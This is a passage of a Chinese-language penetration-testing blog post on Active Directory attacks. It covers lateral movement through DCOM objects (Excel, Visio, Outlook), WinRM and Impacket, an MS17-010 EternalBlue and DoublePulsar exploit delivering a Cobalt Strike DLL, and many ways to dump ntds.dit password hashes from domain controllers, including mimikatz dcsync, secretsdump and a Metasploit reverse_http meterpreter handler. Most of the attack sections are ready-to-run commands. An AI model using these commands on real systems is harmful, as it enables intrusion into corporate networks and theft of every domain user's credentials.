class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br><span class=\"line\">$com.DisplayAlerts = $false</span><br><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用该对象的 &quot;DDEInitiate&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;/c 参数&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Visio.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Visio</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.52.138&quot;)).[0].Document.Application.shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Outlook.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Outlook</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192</span><br><span class=\"line\">.168.52.138&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Impacket <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1kY29tZXhlYy1rZDBtajU0NGEucHk=\">中的 dcomexec.py</span></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dcomexec.exe [domain/]username:password@ip //创建一个交互式shell</span><br><span class=\"line\">dcomexec.exe [domain/]username:password@ip command // 执行命令</span><br><span class=\"line\">dcomexec.exe [domain/]username:@ip -hashes [hash] //hash传递</span><br></pre></td></tr></table></figure>\n<h3 id=\"winrm介绍\"><a class=\"markdownIt-Anchor\" href=\"#winrm介绍\">#</a> <strong>WinRM 介绍</strong></h3>\n<p>WinRM（Windows 远程管理）是 Microsoft 在 Windows 中对 WS-Management 的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM 可以与可能具有基板管理控制器（BMC）的任何远程计算机一起使用，以获取数据。也可以获取基于 Windows 的计算机（包括 WinRM）。 WinRM 默认端口 5985（HTTP 端口）或 5986（HTTPS 端口），若配置了 WINRM 远程服务，当我们拿到一个管理员账户时，可以使用远程连接进行命令执行操作</p>\n<p>winrm 通过 HTTP（5985）或 HTTPS SOAP（5986）端口来进行通信</p>\n<p><strong>winrs.exe</strong></p>\n<p>Winrs.exe 是一个内置的命令行工具，它允许远程命令的执行在 WinRm 的适当的有资格的用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\\ &#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -command &#123;Get-Culture&#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -ScriptBlock &#123;Get-Culture&#125;</span><br></pre></td></tr></table></figure>\n<p>1、执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://192.168.41.147:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n<p>如果出现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Winrs error:WinRM 客户端无法处理该请求。 可以在下列条件下将默认身份验证与 IP 地址结合使用:</span><br><span class=\"line\">传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。 使用 winrm.cmd 配置</span><br><span class=\"line\">TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置</span><br><span class=\"line\">TrustedHosts 的详细信息，请运行以下命令</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>CS 使用自带 winrm 上线</strong></p>\n<p>必须使用域管账号</p>\n<h3 id=\"使用系统漏洞ms17010横向移动\"><a class=\"markdownIt-Anchor\" href=\"#使用系统漏洞ms17010横向移动\">#</a> <strong>使用系统漏洞 ms17010 横向移动</strong></h3>\n<p><strong>Cobalt Strike 生成 DLL</strong></p>\n<p>1、生成 CS 的生成 bin 文件</p>\n<p>2、使用 msf 用 bin 文件生成 dll 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -</span><br><span class=\"line\">f dll -o wanli111.dll</span><br></pre></td></tr></table></figure>\n<p><strong>原版 ms17-010 渗透</strong></p>\n<p>1、CS 执行下面的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Eternalblue-2.2.0.exe --TargetIp 192.168.41.168 --Target WIN72K8R2 --</span><br><span class=\"line\">DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --</span><br><span class=\"line\">VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig</span><br><span class=\"line\">outlog.txt</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp</span><br><span class=\"line\">192.168.41.168 --TargetPort 445 --Protocol SMB --Architecture x64 --Function</span><br><span class=\"line\">RunDLL --DllPayload 123.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --</span><br><span class=\"line\">ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>\n<h2 id=\"域控安全\"><a class=\"markdownIt-Anchor\" href=\"#域控安全\">#</a> 域控安全</h2>\n<h3 id=\"ntdsdit\"><a class=\"markdownIt-Anchor\" href=\"#ntdsdit\">#</a> ntds.dit</h3>\n<p>ntds.dit 为 ad 的数据库，内容有域用户、域组、用户 hash 等信息，域控上的 ntds.dit 只有可以登录到域控的用户（如域管用户、DC 本地管理员用户）可以访问。ntds.dit 包括三个主要表：数据表、链接表、sd 表。所以只要在域渗透中能够获取到 ntds.dit 就可以获取到所有域用户的用户名和对应的 hash，它和 SAM 文件一样，被 windows 系统锁死</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\NTDS</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取移动ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#提取移动ntdsdit文件\">#</a> 提取移动 ntds.dit 文件</h3>\n<p><strong>ntdsutils.exe 提取 ntds.dit</strong></p>\n<p>ntdsutils.exe 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutils.exe 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在域控服务器上，可以在域控制器上直接操作，支持 windows server 2003、2008、2012。提取过程分为 3 步：</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure>\n<p>第二步：加载快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;mount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p>第三步：复制快照中的 ntds.dit 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy &#x27;快照地址\\Windows\\NTDS\\ntds.dit&#x27; 目标地址</span><br></pre></td></tr></table></figure>\n<p>第四步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;umount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; &quot;delete &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p><strong>vssadmin 提取 ntds.dit</strong></p>\n<p>vssadmin1 是 Windows Server 2008 及 Windows 7 系统提供的 VSS 管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统 Provider 创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的 “diffff 空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>\n<p>第二步：复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第三步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>\n<p><strong>vssown 提取 ntds.dit</strong></p>\n<p>vssown.vbs 和 vssadmin 类似，它是由 Tim Tomes 开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务</p>\n<p>第一步：启动卷影复制服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure>\n<p>第二步：创建一个 C 盘的卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>\n<p>第三步：列出当前卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>\n<p>第四步：复制文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第五步：删除卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /delete &#123;B267559B-57D8-4D59-B77F-890CF57BA448&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>IFM</strong></p>\n<p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>\n<p>第一步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>\n<p>此时 ntds.dit 将被保存在 C:\\test\\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在</p>\n<p>C:\\test\\registry 文件夹下</p>\n<p>第二步：删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rmdir /s/q C:\\test</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>通过 impacket 里的 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3JldHNkdW1wLnB5\">secretsdump.py</span> 脚本可以直接远程读取 ntds.dit 并导出哈希值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<h3 id=\"离线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#离线方式读取ntdsdit文件\">#</a> <strong>离线方式读取 ntds.dit 文件</strong></h3>\n<p>离线一般需要两步：</p>\n<p>1、将远端域控的 ntds.dit 下载到本地，</p>\n<p>2、然后利用再在本地进行。</p>\n<p>注意：因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>\n<p>命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\system c:\\windows\\temp\\system.hive</span><br></pre></td></tr></table></figure>\n<p><strong>esedbexport</strong></p>\n<p>安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class=\"line\">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb\u0002experimental-20210424.tar.gz</span><br><span class=\"line\">tar zxvf libesedb-experimental-20210424.tar.gz</span><br><span class=\"line\">cd libesedb-20210424</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br><span class=\"line\">ldconfig</span><br></pre></td></tr></table></figure>\n<p>2、导出 ntds.dit，两个重要的表为：datatable 以及 link_table，他们都会被存放在./ntds.dit.export/ 文件夹中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>\n<p>3、安装 ntdsxtract</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class=\"line\">cd ntdsxtract</span><br><span class=\"line\">python setup.py build</span><br><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n<p>如果提示 ImportError: No module named Crypto.Hash，请执行 pip install pycryptodome</p>\n<p>4、将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 1.txt 里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>将 ntds.dit.export 和 SYSTEM 文件放入到 和 secretsdump.exe 同级目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>\n<p><strong>NTDSDump.exe</strong></p>\n<p>NTDSDumpEx.exe 可以进行导出哈希值的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NTDSDumpEx -d ntds.dit -s system -o 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>DSInternals</strong></p>\n<p>DSInternals 是 powershell 脚本，可以离线读取 ntds 文件</p>\n<p>安装 DSInternals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Install-Module DSInternals -Force</span><br></pre></td></tr></table></figure>\n<p>导出 hash，并保存在 txt 文件里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key = Get-Bootkey -SystemHivePath &#x27;system路径&#x27; Get-ADDBAccount -All -DBPath &#x27;ntds路径&#x27; -Bootkey $key | Out-File output_hash.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"在线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#在线方式读取ntdsdit文件\">#</a> <strong>在线方式读取 ntds.dit 文件</strong></h3>\n<p>在线的方式就是直接读取不需要在导出 ntds 文件，在域环境中，不要直接在线获取 hash，特别是域环境比较大的时候，在线获取 hash 等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p>\n<p><strong>mimikatz</strong></p>\n<p>1、可以读取所有用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /all /csv</span><br></pre></td></tr></table></figure>\n<p>2、也可以读取单个用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /user:administrator</span><br></pre></td></tr></table></figure>\n<p><strong>Quarks PwDump</strong></p>\n<p>1、上传工具到目标机器，使用命令先导出 ntds 文件，然后直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell QuarksPwDump.exe --dump-hash-domain --ntds-file ntds,dit.</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-DCSync</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Invoke-DCSync.ps1</span><br><span class=\"line\">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>使用 secretsdump 直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<p><strong>MSF 读取 ntds.dit 文件</strong></p>\n<p>离线读取使用 msf 读取 ntds 文件，前提是 msf 必须和域控相同，我们可以使用代理技术，将 msf 代理到内网，然后使用 msf 导出 ntds 文件</p>\n<p>1、使用导出模块进行导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary/admin/smb/psexec_ntdsgrab</span><br></pre></td></tr></table></figure>\n<p>2、填写相关的选项，主要有 IP, 域，用户名和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set RHOSTS 192.168.41.10</span><br><span class=\"line\">set SMBDomain hack.com</span><br><span class=\"line\">set smbuser administrator</span><br><span class=\"line\">set smbpass &quot;123456kl;&#x27;/&quot;</span><br></pre></td></tr></table></figure>\n<p>3、运行之后 ntds 和 system 文件会被保存到 /root/.msf4/loot 下</p>\n<p>4、在相应的目录下找到该文件</p>\n<p>5、使用相应的工具读取该文件即可</p>\n<p><strong>在线读取</strong></p>\n<p>1、使用 cs 或者其他的方式先上线的 msf 中使用派生会话的方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 本机ip</span><br><span class=\"line\">set lport 接受的端口</span><br><span class=\"line\">exploit 执行</span><br></pre></td></tr></table></figure>\n<p>2、拿到 shell 之后执行 hashdump，如果不能执行就迁移进程到 64 位中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">migrate 4812</span><br></pre></td></tr></table></figure>\n<p>3、或者使用下面的脚本，也可以读取域内的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>\n<h2 id=\"跨域攻击\"><a class=\"markdownIt-Anchor\" href=\"#跨域攻击\">#</a> 跨域攻击</h2>\n<p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185010968.png\" alt=\"image-20221214185010968\"></p>\n<p><strong>跨域攻击方法</strong></p>\n<p>1、常规渗透方法（利用 web 漏洞）</p>\n<p>2、哈希传递票据攻击</p>\n<p>3、利用域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185209529.png\" alt=\"image-20221214185209529\"></p>\n<p><strong>域信任关系</strong></p>\n<p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用 DNS 服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，也就不存在通过域信任关系进行跨域资源共享了</p>\n<p><strong>域信任关系分类</strong></p>\n<p>域信任关系分为单向信任和双向信任</p>\n<p>单向信任：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。也就是说，A 域信任 B 域，那么 B 域内受信任的主体可以访问 A 域内信任 B 域的资源。</p>\n<p>双向信任：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通关其父域向上流向信任域</p>\n<p>域信任关系也可以分为内部信任和外部信任</p>\n<p>内部信任：在默认情况下，用活动目录安装向导将新域添加到域树或林根域中，<strong>会自动创建双向可传递信任</strong>。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为内部信任。这种信任关系是可传递的。例如，有三个子域 BA,CA,DA,BA 域信任 CA 域，CA 域信任 DA 域，则 BA 域也信任 DA 域。</p>\n<p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p>\n<p>只有 domain admins 组中的用户可以管理域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185958266.png\" alt=\"image-20221214185958266\"></p>\n<p><strong>搭建和查看域信任关系</strong></p>\n<p><strong>搭建域树（内部信任）</strong></p>\n<p>如果是复制的虚拟机请运行 C:\\Windows\\System32\\sysprep\\sysprep.exe 重新获取 SID，选择通用，重启</p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向父域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221216220001330.png\" alt=\"image-20221216220001330\"></p>\n<p>4、添加到现有林</p>\n<p>5、提供父域的账号密码</p>\n<p>6、正常安装直到结束</p>\n<p><strong>搭建域森林（外部信任）</strong></p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向根域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p>4、添加到现有林</p>\n<p><strong>获取域信息</strong></p>\n<p>在域中，Enterprise Admins 组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权限。在默认情况下，该组包含林中所有域控制器上具有 Administrators 权限的成员</p>\n<p><strong>Enterprise admins 只在根域上有，并且能管理本域中所有的子域</strong></p>\n<p>查看当前域中计算机的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>查看域信任关系</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nltest /domain_trusts</span><br></pre></td></tr></table></figure>\n<p><strong>使用 lg 工具获取域的相关信息</strong></p>\n<p>获取当前域中的用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe abc\\.</span><br></pre></td></tr></table></figure>\n<p>获取远程机器的本地用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu</span><br></pre></td></tr></table></figure>\n<p>获取远程系统中的用户 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu -sidsout</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用域信任密钥获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用域信任密钥获取目标域\">#</a> 